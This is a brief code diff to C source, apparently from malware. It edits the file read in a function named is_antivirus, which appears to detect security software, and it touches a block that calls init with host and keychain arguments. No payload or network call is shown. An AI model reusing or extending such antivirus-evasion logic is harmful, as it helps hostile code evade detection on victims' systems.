@@ -29,7 +29,7 @@ __attribute__((always_inline)) static inline bool is_antivirus(const char *path,
 	if ((fd = _open(path, O_RDONLY, 0000)) < 0)
 		return false;
 
-	_read(fd, buf, _strlen(target) + 1);
+	_read(fd, buf, PATH_MAX);
 	_close(fd);
 
 	while (buf[offset] && (buf[offset] == '.' || buf[offset] == '/'))
@@ -92,4 +92,3 @@ label:
 	else
 		init(host, keychain, context);
 }
-
